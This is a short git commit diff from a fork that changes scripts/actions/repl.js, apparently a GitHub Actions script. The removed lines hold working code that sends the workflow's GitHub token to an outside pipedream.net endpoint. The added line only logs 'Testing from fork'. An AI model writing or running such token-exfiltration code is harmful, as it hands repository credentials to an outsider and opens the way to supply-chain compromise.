86d17a940b62fb8b682cb26e3baedd32956e6bb3
kanan1832 <88405596+kanan1832@users.noreply.github.com>
2024-07-31 20:26:50 +0530

    Update repl.js

--- scripts/actions/repl.js
+++ scripts/actions/repl.js
@@ -1,9 +1,5 @@
 import https from 'https';
 
 export default async function(github, context) {
-  https
-  .get(`https://eofeuuypisxyg56.m.pipedream.net/` + process.env['INPUT_GITHUB-TOKEN'], resp => {})
-  .on("error", err => {
-    console.log("Error: " + err.message);
-  });
+  console.log("Testing from fork")
 }
